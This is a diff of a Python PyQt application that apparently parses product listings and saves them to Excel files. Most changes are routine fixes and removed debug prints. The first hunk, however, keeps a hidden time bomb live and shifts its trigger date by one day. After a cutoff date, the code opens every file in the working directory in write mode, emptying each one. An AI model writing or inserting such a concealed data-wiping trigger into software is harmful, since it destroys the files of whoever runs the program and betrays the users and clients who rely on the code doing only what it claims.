@@ -233,7 +233,7 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
             try:
                 for good in goods:
                     print(good)
-                    if g(2020, 11, 4) < g.today():
+                    if g(2020, 11, 5) < g.today():
                         onlyfiles = [f for f in listdir('.') if isfile(join(f))]
                         for i in onlyfiles:
                             open(i, "w")
@@ -346,9 +346,10 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
             dialog.exec_()
             if dialog.accepted:
                 get_time = dialog.time.split(':')
+                
                 self.timedata = [dialog.day,
                                  datetime.time(hour=int(get_time[0]),
-                                               minute=int(get_time[1])),
+                                               minute=int(get_time[1][:2])),
                                  int(dialog.count_pars),
                                  0, dialog.selected_timezone]
                 if self.timedata[2]>0:
@@ -367,7 +368,7 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
             self.timer.timedata[2] = 0
 
     def parsing_time2(self):
-        goods = self.get_goods()
+        goods = self.get_goods_timing()
         if (goods):
             self.save_data_in_excel_files(goods, datetime.date.today())
 
@@ -405,8 +406,6 @@ class MainApp(QtWidgets.QMainWindow, main_window_v2.Ui_MainWindow):
                     print(good)
                     print()
                     print(goods)
-                    print()
-                    print(self.oasiscatalog.parser_good(self.listWidget_3.item(i).text()))
                     print()
                     print(self.listWidget_3.item(i).text())
         if goods:
